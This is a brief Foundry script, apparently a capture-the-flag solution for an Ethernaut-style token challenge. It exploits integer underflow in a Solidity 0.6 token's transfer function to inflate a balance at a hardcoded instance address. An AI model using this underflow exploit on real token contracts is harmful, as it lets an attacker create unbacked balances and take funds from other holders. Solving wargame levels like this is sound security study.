// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/IToken.sol";
import "forge-std/Script.sol";

contract Attacker is Script {
    Token instance = Token(payable(0xa4516EF85aA1c5D81988c82ccDE5192f0c4EaD25));
    function run() external {
        vm.startBroadcast(uint256(vm.envBytes32("PRIVATE_KEY")));
        instance.transfer(address(this), 20);
        withdraw();
        vm.stopBroadcast();
    }

    function withdraw() public payable {
        instance.transfer(msg.sender, 50);
    }
}